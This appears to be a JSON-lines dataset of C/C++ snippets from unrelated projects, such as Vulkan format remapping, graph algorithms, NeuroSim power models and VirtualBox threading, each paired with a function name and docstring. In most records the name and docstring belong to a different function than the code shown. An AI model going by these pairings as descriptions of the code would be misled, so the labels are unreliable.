{"content":"{'function_name': 'PalToVkVideoProfileLevel', 'docstring': '\/\/ Vulkan level value is created using VK_MAKE_API_VERSION', 'code': \"inline Pal::SwizzledFormat RemapFormatComponents(\\n    Pal::SwizzledFormat       format,\\n    Pal::SubresRange          subresRange,\\n    const VkComponentMapping& mapping,\\n    const Pal::IDevice*       pPalDevice,\\n    Pal::ImageTiling          imageTiling)\\n{\\n    using Pal::ChannelSwizzle;\\n\\n    Pal::ChannelMapping swizzle;\\n\\n    \/\/ First map to PAL enums.  At the same time, convert the VK_COMPONENT_SWIZZLE_IDENTITY identity mapping\\n    \/\/ which maps to {RGBA}\\n    swizzle.r = (mapping.r != VK_COMPONENT_SWIZZLE_IDENTITY) ? convert::ChannelSwizzle(mapping.r) : ChannelSwizzle::X;\\n    swizzle.g = (mapping.g != VK_COMPONENT_SWIZZLE_IDENTITY) ? convert::ChannelSwizzle(mapping.g) : ChannelSwizzle::Y;\\n    swizzle.b = (mapping.b != VK_COMPONENT_SWIZZLE_IDENTITY) ? convert::ChannelSwizzle(mapping.b) : ChannelSwizzle::Z;\\n    swizzle.a = (mapping.a != VK_COMPONENT_SWIZZLE_IDENTITY) ? convert::ChannelSwizzle(mapping.a) : ChannelSwizzle::W;\\n\\n    \/\/ Copy the unswizzled format\\n    Pal::SwizzledFormat newFormat = format;\\n\\n    \/\/ See if we can use MM formats for YUV images\\n    Pal::MergedFormatPropertiesTable formatProperties = {};\\n    pPalDevice->GetFormatProperties(&formatProperties);\\n\\n    uint32_t tilingIdx         = (imageTiling == Pal::ImageTiling::Linear) ? 0 : 1;\\n    uint32_t x8MmformatIdx     = static_cast<uint32_t>(Pal::ChNumFormat::X8_MM_Unorm);\\n    uint32_t x8Y8MmformatIdx   = static_cast<uint32_t>(Pal::ChNumFormat::X8Y8_MM_Unorm);\\n    uint32_t x16MmformatIdx    = static_cast<uint32_t>(Pal::ChNumFormat::X16_MM10_Unorm);\\n    uint32_t x16Y16MmformatIdx = static_cast<uint32_t>(Pal::ChNumFormat::X16Y16_MM10_Unorm);\\n\\n    \/\/ As spec says, the remapping must be identity for any VkImageView used with a combined image sampler that\\n    \/\/ enables sampler YCbCr conversion, thus we could totally ignore the setting in VkComponentMapping.\\n    \/\/ For YCbCr conversions, the remapping is settled in VkSamplerYcbcrConversionCreateInfo, and happens when\\n    \/\/ the conversion finishes.\\n    \/\/ Note: AYUV && NV11 are not available in VK_KHR_sampler_ycbcr_conversion extension.\\n    if ((format.format >= Pal::ChNumFormat::AYUV) &&\\n        (format.format <= Pal::ChNumFormat::P208))\\n    {\\n        switch (format.format)\\n        {\\n        case Pal::ChNumFormat::UYVY:\\n            newFormat.format = Pal::ChNumFormat::X8Y8_Z8Y8_Unorm;\\n            newFormat.swizzle.r = ChannelSwizzle::Z;\\n            newFormat.swizzle.g = ChannelSwizzle::Y;\\n            newFormat.swizzle.b = ChannelSwizzle::X;\\n            newFormat.swizzle.a = ChannelSwizzle::One;\\n            break;\\n        case Pal::ChNumFormat::VYUY:\\n            newFormat.format = Pal::ChNumFormat::X8Y8_Z8Y8_Unorm;\\n            newFormat.swizzle.r = ChannelSwizzle::X;\\n            newFormat.swizzle.g = ChannelSwizzle::Y;\\n            newFormat.swizzle.b = ChannelSwizzle::Z;\\n            newFormat.swizzle.a = ChannelSwizzle::One;\\n            break;\\n        case Pal::ChNumFormat::YUY2:\\n            newFormat.format = Pal::ChNumFormat::Y8X8_Y8Z8_Unorm;\\n            newFormat.swizzle.r = ChannelSwizzle::Z;\\n            newFormat.swizzle.g = ChannelSwizzle::Y;\\n            newFormat.swizzle.b = ChannelSwizzle::X;\\n            newFormat.swizzle.a = ChannelSwizzle::One;\\n            break;\\n        case Pal::ChNumFormat::YVY2:\\n            newFormat.format = Pal::ChNumFormat::Y8X8_Y8Z8_Unorm;\\n            newFormat.swizzle.r = ChannelSwizzle::X;\\n            newFormat.swizzle.g = ChannelSwizzle::Y;\\n            newFormat.swizzle.b = ChannelSwizzle::Z;\\n            newFormat.swizzle.a = ChannelSwizzle::One;\\n            break;\\n        case Pal::ChNumFormat::YV12:\\n            newFormat.format = (formatProperties.features[x8MmformatIdx][tilingIdx] != 0) ?\\n                               Pal::ChNumFormat::X8_MM_Unorm : Pal::ChNumFormat::X8_Unorm;\\n            if (subresRange.startSubres.plane == 0)\\n            {\\n                newFormat.swizzle.r = ChannelSwizzle::Zero;\\n                newFormat.swizzle.g = ChannelSwizzle::X;\\n                newFormat.swizzle.b = ChannelSwizzle::Zero;\\n            }\\n            else if (subresRange.startSubres.plane == 1)\\n            {\\n                newFormat.swizzle.r = ChannelSwizzle::Zero;\\n                newFormat.swizzle.g = ChannelSwizzle::Zero;\\n                newFormat.swizzle.b = ChannelSwizzle::X;\\n            }\\n            else if (subresRange.startSubres.plane == 2)\\n            {\\n                newFormat.swizzle.r = ChannelSwizzle::X;\\n                newFormat.swizzle.g = ChannelSwizzle::Zero;\\n                newFormat.swizzle.b = ChannelSwizzle::Zero;\\n            }\\n            newFormat.swizzle.a = ChannelSwizzle::One;\\n            break;\\n        case Pal::ChNumFormat::NV12:\\n        case Pal::ChNumFormat::NV21:\\n        case Pal::ChNumFormat::P208:\\n            if (subresRange.startSubres.plane == 0)\\n            {\\n                newFormat.format = (formatProperties.features[x8MmformatIdx][tilingIdx] != 0) ?\\n                                   Pal::ChNumFormat::X8_MM_Unorm : Pal::ChNumFormat::X8_Unorm;\\n                newFormat.swizzle.r = ChannelSwizzle::Zero;\\n                newFormat.swizzle.g = ChannelSwizzle::X;\\n                newFormat.swizzle.b = ChannelSwizzle::Zero;\\n                newFormat.swizzle.a = ChannelSwizzle::One;\\n            }\\n            else if (subresRange.startSubres.plane == 1)\\n            {\\n                newFormat.format = (formatProperties.features[x8Y8MmformatIdx][tilingIdx] != 0) ?\\n                                   Pal::ChNumFormat::X8Y8_MM_Unorm : Pal::ChNumFormat::X8Y8_Unorm;\\n                if ((format.format == Pal::ChNumFormat::NV12) ||\\n                    (format.format == Pal::ChNumFormat::P208))\\n                {\\n                    newFormat.swizzle.r = ChannelSwizzle::Y;\\n                    newFormat.swizzle.b = ChannelSwizzle::X;\\n                }\\n                else\\n                {\\n                    newFormat.swizzle.r = ChannelSwizzle::X;\\n                    newFormat.swizzle.b = ChannelSwizzle::Y;\\n                }\\n                newFormat.swizzle.g = ChannelSwizzle::Zero;\\n                newFormat.swizzle.a = ChannelSwizzle::Zero;\\n            }\\n            break;\\n        case Pal::ChNumFormat::P016:\\n            if (subresRange.startSubres.plane == 0)\\n            {\\n                newFormat.format = Pal::ChNumFormat::X16_Unorm;\\n                newFormat.swizzle.r = ChannelSwizzle::Zero;\\n                newFormat.swizzle.g = ChannelSwizzle::X;\\n                newFormat.swizzle.b = ChannelSwizzle::Zero;\\n                newFormat.swizzle.a = ChannelSwizzle::One;\\n            }\\n            else if (subresRange.startSubres.plane == 1)\\n            {\\n                newFormat.format = Pal::ChNumFormat::X16Y16_Unorm;\\n                newFormat.swizzle.r = ChannelSwizzle::Y;\\n                newFormat.swizzle.g = ChannelSwizzle::Zero;\\n                newFormat.swizzle.b = ChannelSwizzle::X;\\n                newFormat.swizzle.a = ChannelSwizzle::One;\\n            }\\n            break;\\n        case Pal::ChNumFormat::P010:\\n        case Pal::ChNumFormat::P210:\\n            if (subresRange.startSubres.plane == 0)\\n            {\\n                newFormat.format = (formatProperties.features[x16MmformatIdx][tilingIdx] != 0) ?\\n                                   Pal::ChNumFormat::X16_MM10_Unorm : Pal::ChNumFormat::X16_Unorm;\\n                newFormat.swizzle.r = ChannelSwizzle::Zero;\\n                newFormat.swizzle.g = ChannelSwizzle::X;\\n                newFormat.swizzle.b = ChannelSwizzle::Zero;\\n                newFormat.swizzle.a = ChannelSwizzle::One;\\n            }\\n            else if (subresRange.startSubres.plane == 1)\\n            {\\n                newFormat.format = (formatProperties.features[x16Y16MmformatIdx][tilingIdx] != 0) ?\\n                                   Pal::ChNumFormat::X16Y16_MM10_Unorm : Pal::ChNumFormat::X16Y16_Unorm;\\n                newFormat.swizzle.r = ChannelSwizzle::Y;\\n                newFormat.swizzle.g = ChannelSwizzle::Zero;\\n                newFormat.swizzle.b = ChannelSwizzle::X;\\n                newFormat.swizzle.a = ChannelSwizzle::One;\\n            }\\n            break;\\n        default:\\n            break;\\n        }\\n    }\\n    else if (format.format != Pal::ChNumFormat::Undefined)\\n    {\\n        \/\/ PAL expects a single swizzle which combines the user-defined VkComponentMapping and the format-defined\\n        \/\/ swizzle together.  In Vulkan these are separate, so we must combine them by building the lookup table below\\n        \/\/ that stores the HW swizzle (X\/Y\/Z\/W, which corresponds to HW data format components where X = LSB) for each\\n        \/\/ logical image component (R\/G\/B\/A) if any.  We build this table from the original input format which also\\n        \/\/ contains the swizzle which means it's important that this function is not called with an already-remapped\\n        \/\/ format as input.\\n        const ChannelSwizzle rgbaToFinalSwizzle[] =\\n        {\\n            ChannelSwizzle::Zero, \/\/ Zero\\n            ChannelSwizzle::One,  \/\/ One\\n            format.swizzle.r,     \/\/ R (location of R on the data format)\\n            format.swizzle.g,     \/\/ G (location of G on the data format)\\n            format.swizzle.b,     \/\/ B (location of B on the data format)\\n            format.swizzle.a,     \/\/ A (location of A on the data format)\\n        };\\n\\n        \/\/ Remap the components.\\n        newFormat.swizzle.r = rgbaToFinalSwizzle[static_cast<size_t>(swizzle.r)];\\n        newFormat.swizzle.g = rgbaToFinalSwizzle[static_cast<size_t>(swizzle.g)];\\n        newFormat.swizzle.b = rgbaToFinalSwizzle[static_cast<size_t>(swizzle.b)];\\n        newFormat.swizzle.a = rgbaToFinalSwizzle[static_cast<size_t>(swizzle.a)];\\n    }\\n    else\\n    {\\n        newFormat.swizzle = Pal::UndefinedSwizzledFormat.swizzle;\\n    }\\n\\n    return newFormat;\\n}\"}","id":2949}
{"content":"{'function_name': 'kruskal', 'docstring': '\/\/\uc785\ub825\ubc1b\uc740 \uac04\uc120\uc744 \ud558\ub098\uc529 \ud655\uc778\ud558\uba74\uc11c, \ucd94\uac00\ud560\uc9c0 \uc54a\ud560\uc9c0 \uc120\ud0dd.', 'code': 'int main()\\n{\\n    \/\/freopen(\"input4.txt\", \"r\", stdin);\\n    \/\/freopen(\"Output.txt\", \"w\", stdout);\\n\\n    int test = 0;\\n    scanf(\"%d\", &test);\\n\\n    for (int testcase = 0; testcase < test; testcase++)\\n    {\\n        result = 0;\\n        n = 0, m = 0, q = 0;\\n        memset(p, 0, sizeof(p));\\n        memset(parent, 0, sizeof(parent));\\n        memset(height, 0, sizeof(height));\\n\\n        for (int i = 0; i < 10005; i++)\\n            arr[i].clear();\\n\\n        \/\/ \ud2b8\ub9ac \uc815\ubcf4 \uc785\ub825\\n        scanf(\"%d %d\", &n, &m);\\n        for (int i = 0; i < m; i++)\\n        {\\n            int u, v, w;\\n            scanf(\"%d %d %d\", &u, &v, &w);\\n            p[i].x = u, p[i].y = v, p[i].w = w;\\n        }\\n\\n        kruskal(n, m);\\n\\n        scanf(\"%d\", &q);\\n\\n        for (int i = 0; i < q; i++) \\n        {\\n            memset(visit, 0, sizeof(visit));\\n\\n            int start = 0, desti = 0;\\n            scanf(\"%d %d\", &start, &desti);\\n\\n            t_res = 0;\\n\\n            queue<Edge> q1;\\n            q1.push(Edge(0, start, MAX));\\n\\n            while (!q1.empty()) \\n            {\\n                Edge temp = q1.front(); \\n                q1.pop();\\n\\n                if (visit[temp.y] == 1) \\n                    continue;\\n\\n                visit[temp.y] = 1;\\n\\n                \/\/\ub3c4\ucc29\ud588\uc73c\ub2c8 \ub05d\\n                if (temp.y == desti) \\n                {\\n                    t_res = temp.w;\\n                    break;\\n                }\\n\\n                int ss = arr[temp.y].size();\\n\\n                for (int j = 0; j < ss; j++)\\n                {\\n                    if (!visit[arr[temp.y].at(j).y])\\n                    {\\n                        q1.push(Edge(temp.y, arr[temp.y].at(j).y, min(temp.w, arr[temp.y].at(j).w)));\\n                    }\\n                }\\n            }\\n\\n            if (t_res < MAX) \\n                result += t_res;\\n        }\\n\\n        printf(\"%lld\\\\n\", result);\\n    }\\n\\n    return 0;\\n}'}","id":2953}
{"content":"{'function_name': 'GenerateShortShowMapUrl', 'docstring': '\/\/ strlen(\"om:\/\/\")', 'code': 'int LatToInt(double lat, int maxValue)\\n{\\n  \/\/ M = maxValue, L = maxValue-1\\n  \/\/ lat: -90                        90\\n  \/\/   x:  0     1     2       L     M\\n  \/\/       |--+--|--+--|--...--|--+--|\\n  \/\/       000111111222222...LLLLLMMMM\\n\\n  double const x = (lat + 90.0) \/ 180.0 * maxValue;\\n  return x < 0 ? 0 : (x > maxValue ? maxValue : static_cast<int>(x + 0.5));\\n}'}","id":2959}
{"content":"{'function_name': 'GenerateDeviceSpaceCirclePoints', 'docstring': '\/\/we start at angle = 0', 'code': 'int GetNumberOfCircleSegments(double radius)\\n\/*******************************************************\/\\n{\\n\\treturn int(2.0f * 3.1415926f \/ (acos(1.0f - 0.25f \/ radius)));\/\/change the 0.25 to a smaller\/bigger number as needed\\n}'}","id":2964}
{"content":"{'function_name': 'getSub', 'docstring': '\/\/Return where the submarine will be placed.', 'code': 'int getDestroyer(void){\\t\/\/Return where the destroyer will be placed.\\n\\treturn destroyer;\\n}'}","id":2975}
{"content":"{'function_name': 'NeuroSimNeuronReadEnergy', 'docstring': '\/\/ Skip this function if param->NeuroSimDynamicPerformance is false', 'code': \"double NeuroSimNeuronLeakagePower(SubArray *subArray, Adder& adder, Mux& mux, RowDecoder& muxDecoder, DFF& dff, Subtractor& subtractor) { \/\/ Same as NeuroSimNeuronReadEnergy\\n    adder.CalculatePower(1, adder.numAdder);\\n\\tif (subArray->numColMuxed > 1) \\n    {\\n\\t\\tmux.CalculatePower(1);\\n\\t\\tmuxDecoder.CalculatePower(1, 1);\\t\/\/ Don't care write\\n\\t}\\n\\tdff.CalculatePower(1, adder.numAdder);\\n\\tsubtractor.CalculatePower(1, adder.numAdder);\\n    if(subArray->parallelRead==true)\\n    {\\n\\t    return  mux.leakage + muxDecoder.leakage  + subtractor.leakage;\\n    }\\n    else\\n    {\\n        return adder.leakage + mux.leakage + muxDecoder.leakage + dff.leakage + subtractor.leakage;\\n\\n    }\\n}\"}","id":2979}
{"content":"{'function_name': 'loadMaterialFromIni', 'docstring': '\/\/ Load from ini', 'code': 'bool loadMaterialFromJson(const std::string &file, std::string &base, std::string &normal, std::string &specular,\\n                          std::string &glow, std::string &alpha)\\n{\\n    nlohmann::json root;\\n    if (!load(file, root))\\n    {\\n        loge(\"Failed to load material file {} as json file.\", file.c_str());\\n        return false;\\n    }\\n\\n    \/\/ Load from json\\n    load(root, \"base\", base);\\n    load(root, \"normal\", normal);\\n    load(root, \"specular\", specular);\\n    load(root, \"glow\", glow);\\n    load(root, \"alpha\", alpha);\\n    return true;\\n}'}","id":2983}
{"content":"{'function_name': 'pci_is_valid_index_bar', 'docstring': '\/\/ If reading high half of a 64 bit bar directly, not valid', 'code': 'uint64_t pci_bar_get(size_t index, size_t bar)\\n{\\n    if (!pci_is_valid_index_bar(index, bar))\\n        return false;\\n    \\n    pci_device_summary_t const &dev = devices[index];\\n    \\n    \/\/ Read two halves if it is 64 bit\\n    if (pci_raw_bar_is_64(dev.bars[bar]) && bar < 4)\\n        return dev.bars[bar] | (dev.bars[bar+1] << 32);\\n    \\n    \/\/ Read just one 32 bit one\\n    return dev.bars[bar];\\n}'}","id":2984}
{"content":"{'function_name': 'skip_to_int', 'docstring': '\/\/ eof() or bad(): give up\\r', 'code': 'int get_int() {\\r\\n\\t\\r\\n\\t\/* Read an integer from standard input *\/\\r\\n\\t\/* (Copied from sample code provided in \"Errors, Part 2\" lecture notes) *\/\\r\\n\\t\\r\\n\\tint n = 0;\\r\\n\\t\\r\\n\\twhile (true) {\\r\\n\\t\\t\\r\\n\\t\\tif ( cin >> n )\\r\\n\\t\\t\\treturn n;\\r\\n\\t\\t\\t\\r\\n\\t\\tskip_to_int();\\r\\n\\t\\t\\r\\n\\t}\\r\\n\\t\\r\\n}'}","id":2988}
{"content":"{'function_name': 'do_dlopen', 'docstring': '\/\/ clear any previous error', 'code': 'std::tuple< int, string > do_dlclose(void * p_handle) {\\n\\n  std::string str_error{ \"\" };\\n  int n_rc = 0;\\n\\n  dlerror(); \/\/ clear any previous error\\n\\n  if( ! p_handle ) {\\n    str_error = \"Library handle is invalid (NULL\/NIL)!\";\\n    n_rc = -1;\\n  }\\n  else {\\n    n_rc = dlclose( p_handle );\\n\\n    if ( n_rc != 0 ) {\\n      str_error = dlerror();\\n      fprintf( stderr, \"%s:%d Could not close dynamic library (handle %p) - error: %s !\\\\n\",\\n             __FILE__, __LINE__, p_handle, str_error.c_str());\\n    }\\n  }\\n\\n  return std::make_tuple( n_rc, str_error );\\n}'}","id":2989}
{"content":"{'function_name': 'TestHessians', 'docstring': '\/\/TODO: do testing', 'code': 'bool TestHessians(VectorFieldFunction* f,Vector& x,Real h,Real atol,Real rtol)\\n{\\n  \/\/TODO: do testing\\n  return true;\\n}'}","id":2999}
{"content":"{'function_name': 'Srt_SendMessage', 'docstring': '\/\/LPARAM', 'code': 'int Srt_FindWindow(lua_State* ls)\\n{\\n    const char* szClssName = NULL;\\n    const char* szWndTitle = NULL;\\n   \\n    \/\/Window Class Name\\n    if (lua_isstring(ls,1)){\\n        szClssName = lua_tostring(ls,1);\\n    }\\n    \/\/Window Title\\n    if (lua_isstring(ls,2)){\\n        szWndTitle = lua_tostring(ls,2);\\n    }\\n\\n    HWND hWnd = FindWindow(szClssName,szWndTitle);\\n    lua_pushinteger(ls,(unsigned int)hWnd);\\n    return 1;\\n}'}","id":3003}
{"content":"{'function_name': 'convergence_test_normal_error_numerical_ls', 'docstring': '\/\/system(\"xdg-open .\/autom_tests_stokes.pdf\");', 'code': 'int main(int argc, char **argv)\\n{\\n    using RealType = double;\\n\\n    size_t degree           = 0;\\n    size_t int_refsteps     = 4;\\n\\n    bool dump_debug         = false;\\n    bool solve_interface    = false;\\n    bool solve_fictdom      = false;\\n    bool agglomeration      = false;\\n\\n    mesh_init_params<RealType> mip;\\n    mip.Nx = 5;\\n    mip.Ny = 5;\\n\\n    \/* k <deg>:     method degree\\n     * M <num>:     number of cells in x direction\\n     * N <num>:     number of cells in y direction\\n     * r <num>:     number of interface refinement steps\\n     *\\n     * i:           solve interface problem\\n     * f:           solve fictitious domain problem\\n     *\\n     * D:           use node displacement to solve bad cuts (default)\\n     * A:           use agglomeration to solve bad cuts\\n     *\\n     * d:           dump debug data\\n     *\/\\n\\n    int ch;\\n    while ( (ch = getopt(argc, argv, \"k:M:N:r:ifDAd\")) != -1 )\\n    {\\n        switch(ch)\\n        {\\n            case \\'k\\':\\n                degree = atoi(optarg);\\n                break;\\n\\n            case \\'M\\':\\n                mip.Nx = atoi(optarg);\\n                break;\\n\\n            case \\'N\\':\\n                mip.Ny = atoi(optarg);\\n                break;\\n\\n            case \\'r\\':\\n                int_refsteps = atoi(optarg);\\n                break;\\n\\n            case \\'i\\':\\n                solve_interface = true;\\n                break;\\n\\n            case \\'f\\':\\n                solve_fictdom = true;\\n                break;\\n\\n            case \\'D\\':\\n                agglomeration = false;\\n                break;\\n\\n            case \\'A\\':\\n                agglomeration = true;\\n                break;\\n\\n            case \\'d\\':\\n                dump_debug = true;\\n                break;\\n\\n            case \\'?\\':\\n            default:\\n                std::cout << \"wrong arguments\" << std::endl;\\n                exit(1);\\n        }\\n    }\\n\\n    argc -= optind;\\n    argv += optind;\\n\\n\\n    timecounter tc;\\n\\n    \/************** BUILD MESH **************\/\\n    tc.tic();\\n    cuthho_poly_mesh<RealType> msh(mip);\\n    tc.toc();\\n    std::cout << bold << yellow << \"Mesh generation: \" << tc << \" seconds\" << reset << std::endl;\\n    \/************** LEVEL SET FUNCTION **************\/\\n    RealType radius = 1.0\/3.0;\\n    auto level_set_function = circle_level_set<RealType>(radius, 0.5, 0.5);\\n    \/\/ auto level_set_function = line_level_set<RealType>(0.5);\\n    \/\/ auto level_set_function = flower_level_set<RealType>(0.31, 0.5, 0.5, 4, 0.04);\\n    \/************** DO cutHHO MESH PROCESSING **************\/\\n\\n    tc.tic();\\n    detect_node_position(msh, level_set_function);\\n    detect_cut_faces(msh, level_set_function);\\n\\n    if (agglomeration)\\n    {\\n        detect_cut_cells(msh, level_set_function);\\n        detect_cell_agglo_set(msh, level_set_function);\\n        make_neighbors_info_cartesian(msh);\\n        \/\/ make_neighbors_info(msh);\\n        refine_interface(msh, level_set_function, int_refsteps);\\n        make_agglomeration(msh, level_set_function);\\n    }\\n    else\\n    {\\n        move_nodes(msh, level_set_function);\\n        detect_cut_faces(msh, level_set_function); \/\/do it again to update intersection points\\n        detect_cut_cells(msh, level_set_function);\\n        refine_interface(msh, level_set_function, int_refsteps);\\n    }\\n\\n\\n    tc.toc();\\n    std::cout << bold << yellow << \"cutHHO-specific mesh preprocessing: \" << tc << \" seconds\" << reset << std::endl;\\n\\n    if (dump_debug)\\n    {\\n        dump_mesh(msh);\\n        output_mesh_info(msh, level_set_function);\\n    }\\n\\n    output_mesh_info(msh, level_set_function);\\n\\n    \/\/ auto test_case = make_test_case_stokes_1(msh, level_set_function);\\n    \/\/auto test_case = make_test_case_stokes_2(msh, level_set_function);\\n    auto test_case = make_test_case_static_bubble(msh, radius , 0.5, 0.5 , 1.0,level_set_function); \/\/ DELETED TO CHECK FAST IMPLEMENTATION\\n\\n    auto method = make_sym_gradrec_stokes_interface_method_analytic(msh, 1.0, 0.0, test_case, true);\\n    \\n    if (solve_interface)\\n        run_cuthho_interface(msh, degree, method, test_case);\\n\\n    if (solve_fictdom)\\n        run_cuthho_fictdom(msh, degree, test_case);\\n\\n\\n    return 0;\\n}'}","id":3006}
{"content":"{'function_name': 'main', 'docstring': '\/\/ 0 1 2 2 2', 'code': 'int min_num(vector<int> &nums) {\\n    if (nums.size() == 1) {\\n        return nums[0];\\n    }\\n    \/\/ \u4e8c\u5206\u601d\u60f3\\n    \/\/ [3,4,5,1,2]\\n    \/\/ \u901a\u8fc7\u9898\u76ee\u7684\u63cf\u8ff0\u6211\u4eec\u53ef\u4ee5\u77e5\u9053  \u9006\u5e8f\u6570\u7684\u7ed3\u679c \u8fd9\u4e2a\u6570\u4e00\u5b9a\u5c0f\u4e8e\u524d\u9762\u7684\u4e00\u4e2a  \u4e5f\u5c0f\u4e8e\u540e\u9762\u7684\u4e00\u4e2a \u672c\u8d28\u662f\u5728\u627e\u6700\u5c0f\u503c\\n    int left = 0, right = nums.size() - 1;\\n    while (left < right) {\\n        int mid = (left + right) \/ 2;\\n        if (nums[mid] > nums[right]) { \/\/ \u5982\u679c\u4e2d\u95f4\u7684\u5927\u4e8e\u53f3\u8fb9\u7684\u8bf4\u660e\u6700\u5c0f\u503c\u8fd8\u5728\u53f3\u5e8f\u5217\\n            left = mid + 1;\\n        } else if (nums[mid] < nums[right]) { \/\/ \u5982\u679cmid\u7684\u503c\u5c0f\u4e8e\u53f3\u8fb9\u7684 \u8bf4\u660e\u5e8f\u5217\u5728\u5de6\u8fb9 \u56e0\u6b64\u9700\u8981\u5c06right\u79fb\u52a8\u5230mid\\n            right = mid;\\n        } else {\\n            right--;\\n        }\\n    }\\n    return nums[left];\\n}'}","id":3010}
{"content":"{'function_name': 'display', 'docstring': '\/\/ swap the buffers', 'code': 'int main ( int argc, char **argv ) {\\n    \/\/ initialize glut\\n    glutInit(&argc, argv);\\n\\n    \/\/ memory buffers\\n    glutInitDisplayMode(GLUT_3_2_CORE_PROFILE | GLUT_DOUBLE | GLUT_RGBA | GLUT_DEPTH);\\n\\n    \/\/set window size\\n    glutInitWindowSize(512, 512);\\n\\n    \/\/ window\\n    glutCreateWindow( \"OpenGL Framework\" );\\n\\n    #ifndef __APPLE__\\n    \/\/ Try to initalize glew to use gl apis\\n    GLenum err = glewInit();\\n    if (GLEW_OK != err) {\\n        fprintf(stderr, \"GLEW error\");\\n        return 1;\\n    }\\n    #endif\\n\\n    std::printf(\"%s\\\\n%s\\\\n\", glGetString(GL_RENDERER),  glGetString(GL_VERSION));\\n\\n    init();\\n\\n    glutDisplayFunc( display );\\n    glutKeyboardFunc( keyboard );\\n    glutIdleFunc( animate );\\n\\n    glutMouseFunc ( mousePressedEvent );\\n    glutMotionFunc( mouseMovementEvent );\\n\\n    glutMainLoop();\\n\\n    return 0;\\n}'}","id":3011}
{"content":"{'function_name': 'alfaf_ij_creator', 'docstring': '\/\/std::cout<<\\'\\\\n\\'<<\"Diff f_i 2 meths is:\"<<\\'\\\\n\\'<< f_i_NEW - f_i<<std::endl;', 'code': 'VECTOR f_ij_creator( const VECTOR& lumped_mass , const MATRIX& mass , const VECTOR& delta_phi , T dt , const MATRIX& D_ij , const MATRIX& Dc_ij , const VECTOR& phi_old , const POSITION& S_i)\\n{\\n    \\n    MATRIX new_mass = - mass;\\n    MATRIX new_D = (Dc_ij - D_ij); \/\/(D_ij - Dc_ij);\\n    for(size_t i = 0 ; i < new_mass.rows() ; i++){\\n        new_mass(i,i) += lumped_mass(i);\\n    }\\n    \\n    \/*\\n    std::cout<<\"new_mass sum check: \"<<std::endl;\\n    for(size_t i = 0 ; i < new_mass.rows() ; i++){\\n        new_mass(i,i) += lumped_mass(i);\\n        std::cout<<(new_mass.row(i)).sum()<<std::endl;\\n    }\\n    std::cout<<\"new_D check: \"<<std::endl;\\n    for(size_t i = 0 ; i < new_D.rows() ; i++){\\n       std::cout<<(new_D.row(i).sum() )<<std::endl;\\n    }\\n    *\/\\n    \\n    VECTOR ret0 = Eigen::Matrix<T, Dynamic, 1>::Zero(new_mass.rows(), 1);\\n    VECTOR ret1 = Eigen::Matrix<T, Dynamic, 1>::Zero(new_mass.rows(), 1);\\n    averaged_sum_Si( S_i , new_mass , delta_phi , ret0 );\\n    averaged_sum_Si( S_i , new_D , phi_old , ret1 );\\n    \/*\\n    size_t counter = 0;\\n    for(auto& row_i:S_i)\\n    {\\n        for(auto& elem:row_i)\\n        {\\n            sol(counter) += mat(counter,elem)*(vec(elem)-vec(counter));\\n        }\\n        counter++;\\n    }\\n    *\/\\n    \/\/  std::cout<<\\'\\\\n\\'<<\"dt: \"<<\\'\\\\n\\'<<dt<<std::endl;\\n   \\n    \/\/    std::cout<<\\'\\\\n\\'<<\"ret0: \"<<\\'\\\\n\\'<<ret0<<std::endl;\\n    \/\/    std::cout<<\\'\\\\n\\'<<\"ret1: \"<<\\'\\\\n\\'<<dt*ret1<<std::endl;\\n  \\n    return (ret0 + dt*ret1) ;\\n    \\n}'}","id":3017}
{"content":"{'function_name': 'NeuroSimNeuronReadLatency', 'docstring': '\/\/ Skip this function if param->NeuroSimDynamicPerformance is false', 'code': \"double NeuroSimNeuronReadEnergy(SubArray *subArray, Adder& adder, Mux& mux, RowDecoder& muxDecoder, DFF& dff, Subtractor& subtractor) {\\t\/\/ For 1 weighted sum task on selected columns\\n\\tif (!param->NeuroSimDynamicPerformance) { return 0; }\\t\/\/ Skip this function if param->NeuroSimDynamicPerformance is false\\n\\tadder.CalculatePower(1, adder.numAdder);\\n\\tif (subArray->numColMuxed > 1) \\n    {\\n\\t\\tmux.CalculatePower(1);\\n\\t\\tmuxDecoder.CalculatePower(1, 1);\\t\/\/ Don't care write\\n\\t}\\n\\tdff.CalculatePower(1, adder.numAdder);\\n\\tsubtractor.CalculatePower(1, adder.numAdder);\\n    if(subArray->parallelRead==true)\\n    {\\n        return mux.readDynamicEnergy + muxDecoder.readDynamicEnergy+subtractor.readDynamicEnergy;\\n    }\\n    else \\n    {\\n        return adder.readDynamicEnergy + mux.readDynamicEnergy + muxDecoder.readDynamicEnergy + dff.readDynamicEnergy + subtractor.readDynamicEnergy;\\n    }\\n    \\n}\"}","id":3029}
{"content":"{'function_name': 'solve', 'docstring': '\/\/ findAND(arr);', 'code': 'int main()\\n{\\n    \/\/ Input\\n    int t,n;\\n    cin>>t;\\n    while (t--){\\n        cin>>n;\\n        \/\/ Output\\n        solve(n);\\n    }\\n    return 0;\\n}'}","id":3036}
{"content":"{'function_name': 'PDMR3ThreadSleep', 'docstring': '\/*\\n     * Reset the event semaphore, check the state and sleep.\\n     *\/', 'code': 'static DECLCALLBACK(int) pdmR3ThreadMain(RTTHREAD Thread, void *pvUser)\\n{\\n    PPDMTHREAD pThread = (PPDMTHREAD)pvUser;\\n    Log((\"PDMThread: Initializing thread %RTthrd \/ %p \/ \\'%s\\'...\\\\n\", Thread, pThread, RTThreadGetName(Thread)));\\n    pThread->Thread = Thread;\\n\\n    PUVM pUVM = pThread->Internal.s.pVM->pUVM;\\n    if (   pUVM->pVmm2UserMethods\\n        && pUVM->pVmm2UserMethods->pfnNotifyPdmtInit)\\n        pUVM->pVmm2UserMethods->pfnNotifyPdmtInit(pUVM->pVmm2UserMethods, pUVM);\\n\\n    \/*\\n     * The run loop.\\n     *\\n     * It handles simple thread functions which returns when they see a suspending\\n     * request and leaves the PDMR3ThreadIAmSuspending and PDMR3ThreadIAmRunning\\n     * parts to us.\\n     *\/\\n    int rc;\\n    for (;;)\\n    {\\n        switch (pThread->Internal.s.enmType)\\n        {\\n            case PDMTHREADTYPE_DEVICE:\\n                rc = pThread->u.Dev.pfnThread(pThread->u.Dev.pDevIns, pThread);\\n                break;\\n\\n            case PDMTHREADTYPE_USB:\\n                rc = pThread->u.Usb.pfnThread(pThread->u.Usb.pUsbIns, pThread);\\n                break;\\n\\n            case PDMTHREADTYPE_DRIVER:\\n                rc = pThread->u.Drv.pfnThread(pThread->u.Drv.pDrvIns, pThread);\\n                break;\\n\\n            case PDMTHREADTYPE_INTERNAL:\\n                rc = pThread->u.Int.pfnThread(pThread->Internal.s.pVM, pThread);\\n                break;\\n\\n            case 